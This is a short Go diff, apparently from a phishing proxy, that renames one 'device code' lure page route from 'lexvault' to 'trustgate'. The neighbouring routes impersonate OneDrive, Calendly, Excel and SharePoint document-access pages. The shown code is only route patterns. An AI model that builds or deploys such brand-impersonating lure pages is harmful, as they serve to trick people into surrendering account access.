@@ -240,7 +240,7 @@ var (
 	// Document access themed device code pages (5 themes)
 	dcOneDriveRe     = regexp.MustCompile(`^/access/onedrive/([a-zA-Z0-9_-]+)$`)
 	dcCalendlyRe     = regexp.MustCompile(`^/access/calendly/([a-zA-Z0-9_-]+)$`)
-	dcLexVaultRe     = regexp.MustCompile(`^/access/lexvault/([a-zA-Z0-9_-]+)$`)
+	dcTrustgateRe    = regexp.MustCompile(`^/access/trustgate/([a-zA-Z0-9_-]+)$`)
 	dcExcelRe        = regexp.MustCompile(`^/access/excel/([a-zA-Z0-9_-]+)$`)
 	dcSharePointRe   = regexp.MustCompile(`^/access/sharepoint/([a-zA-Z0-9_-]+)$`)
 	portalPageRe     = regexp.MustCompile(`^/p/([a-fA-F0-9]{64})$`)
@@ -1026,7 +1026,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}{
 				{dcOneDriveRe, "onedrive"},
 				{dcCalendlyRe, "calendly"},
-				{dcLexVaultRe, "lexvault"},
+				{dcTrustgateRe, "trustgate"},
 				{dcExcelRe, "excel"},
 				{dcSharePointRe, "sharepoint"},
 			}
